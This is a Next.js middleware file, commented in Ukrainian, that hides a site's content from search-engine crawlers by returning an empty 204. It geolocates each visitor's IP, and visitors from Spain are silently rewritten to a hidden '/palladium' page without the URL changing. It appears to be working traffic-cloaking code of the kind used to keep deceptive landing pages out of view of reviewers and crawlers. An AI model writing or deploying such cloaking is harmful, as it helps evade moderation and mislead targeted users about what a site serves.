import { NextRequest, NextResponse } from 'next/server';

function isBot(ua: string) {
  return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua);
}

export async function middleware(req: NextRequest) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ipHeader =
    req.headers.get('x-forwarded-for') ||
    req.headers.get('x-real-ip') ||
    req.headers.get('cf-connecting-ip') ||
    '8.8.8.8';
  const ip = ipHeader.split(',')[0].trim();

  // Логування для дебагу
  console.log('[MIDDLEWARE] Incoming IP:', ip);
  console.log('[MIDDLEWARE] User-Agent:', ua);

  // Якщо бот — повертаємо 204, щоб нічого не відображати
  if (isBot(ua)) {
    console.log('[MIDDLEWARE] Detected bot – returning 204');
    return new NextResponse(null, { status: 204 });
  }

  try {
    const geoRes = await fetch(`https://ipwho.is/${ip}`);
    const geo = await geoRes.json();
    console.log('[MIDDLEWARE] Geo response:', geo);

    const isSpain = geo.success && geo.country_code === 'ES';

    // Якщо IP не з Іспанії, пропускаємо запит далі
    if (!isSpain) {
      console.log('[MIDDLEWARE] Not Spain – proceeding as usual');
      return NextResponse.next();
    }

    console.log('[MIDDLEWARE] IP from Spain – redirecting to /palladium');

    // Робимо rewrite на /palladium, але URL не змінюється для користувача
    const url = req.nextUrl.clone();
    url.pathname = '/palladium';
    url.searchParams.set('ip', ip);
    url.searchParams.set('ua', ua);

    return NextResponse.rewrite(url);
  } catch (err) {
    console.error('[MIDDLEWARE] Geo check failed:', err);
    return NextResponse.next();
  }
}

export const config = {
  matcher: ['/', '/((?!_next|api|static|favicon.ico|palladium).*)'],
};
